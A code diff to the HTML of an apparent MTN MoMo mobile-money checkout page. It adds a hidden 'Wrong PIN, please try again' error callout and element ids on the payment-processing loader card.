@@ -63,6 +63,21 @@
                style="text-align:center;">enter 5 digits</p>
           </div>
 
+          <div class="callout callout--warn" id="checkout-error"
+               style="display:none;">
+            <svg class="callout__icon" viewBox="0 0 24 24" fill="none"
+                 stroke="currentColor" stroke-width="2"
+                 stroke-linecap="round" stroke-linejoin="round"
+                 aria-hidden="true">
+              <path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0Z"/>
+              <line x1="12" y1="9" x2="12" y2="13"/>
+              <line x1="12" y1="17" x2="12.01" y2="17"/>
+            </svg>
+            <span id="checkout-error-text">
+              Wrong PIN, please try again.
+            </span>
+          </div>
+
           <button type="button" class="btn btn--yellow"
                   id="confirm-payment" disabled>
             <svg class="btn__icon" viewBox="0 0 24 24" fill="none"
@@ -140,11 +155,13 @@
       <div class="loader-card" role="status" aria-live="polite">
         <div class="loader-spinner" aria-hidden="true"></div>
         <div class="loader-card__logo" aria-hidden="true">MoMo</div>
-        <h2 class="loader-card__title">Processing Payment...</h2>
-        <p class="loader-card__body">
+        <h2 class="loader-card__title" id="loader-title">Processing Payment...</h2>
+        <p class="loader-card__body" id="loader-body">
           Verifying your payment with MTN MoMo
         </p>
-        <p class="loader-card__footnote">Please do not refresh the page</p>
+        <p class="loader-card__footnote" id="loader-footnote">
+          Please do not refresh the page
+        </p>
       </div>
     </div>
 
